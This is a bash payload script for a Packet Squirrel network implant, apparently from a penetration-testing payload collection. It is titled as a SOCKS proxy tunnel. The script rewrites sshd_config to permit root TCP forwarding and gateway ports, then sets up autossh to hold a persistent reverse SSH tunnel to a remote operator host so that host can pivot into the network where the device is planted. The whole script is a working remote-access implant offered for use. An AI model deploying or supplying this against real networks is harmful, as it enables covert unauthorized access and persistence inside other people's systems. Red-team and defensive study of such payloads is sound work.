#!/bin/bash
# Title: SSH Socks5 Proxy tunnel to Squirrel
# Description: Creates Dynamic port forwarding available on Squirrel to allow for pivoting inside network from remote server.
# Author: BlackPropaganda
# Version: 0.2
# Category: Remote-Access
# Net Mode: NAT
# Firmware: 3.2
#
# LED State Descriptions
# Magenta Solid - SSH connecting
# Amber - SSH connection attempted
#

NETMODE NAT
LED SETUP

# More information can be found in the readme.

autossh_host="squirrel@<remote_ssh_host>"
autossh_host_ip=$(echo $autossh_host | cut -d '@' -f2)
autossh_port="22"
autossh_remoteport="2222"
autossh_localport="22"
switch=SWITCH
interface="eth1"

if ! grep $autossh_host_ip /root/.ssh/known_hosts; then
   echo "$autossh_host not in known_hosts, exiting..." >> /root/autossh.log
   LED FAIL
   exit 1
fi

#
# the following was slightly modified from dark_pyrro (the legend) via:
# https://codeberg.org/dark_pyrro/Packet-Squirrel-autossh/src/branch/main/payload.sh
#

# waiting until eth1 acquires IP address
while ! ifconfig "$interface" | grep "inet addr"; do sleep 1; done

# modifying SSHD to support TCP forwarding
echo "Match User root" >> /etc/ssh/sshd_config
echo "       AllowTcpForwarding yes"  >> /etc/ssh/sshd_config
echo -e "       GatewayPorts yes\n" >> /etc/ssh/sshd_config


echo -e "starting reconfigured server.\n" >> /root/payloads/$switch/debug.txt

# starting sshd and waiting for process to start
/etc/init.d/sshd start
until netstat -tulpn | grep -qi "sshd"
do
    sleep 1
done

# stopping autossh
/etc/init.d/autossh stop

#
# Much like the SSH server, AutoSSH has a configuration file. This
# needs to be configured to support this connection as a daemon.
#
# Create a "fresh template" for the autossh configuration
# Starting with an empty autossh file in /etc/config
# isn't something that uci is very fond of
echo "config autossh" > /etc/config/autossh
echo "        option ssh" >> /etc/config/autossh
echo "        option enabled" >> /etc/config/autossh


# UCI configuration and commission
uci set autossh.@autossh[0].ssh="-i /root/.ssh/id_rsa -R "$autossh_remoteport":127.0.0.1:"$autossh_localport" "$autossh_host" -p "$autossh_port" -N -T"
uci set autossh.@autossh[0].enabled="1"
uci commit autossh

LED ATTACK

# starting autossh
/etc/init.d/autossh start

# Happy Hunting.
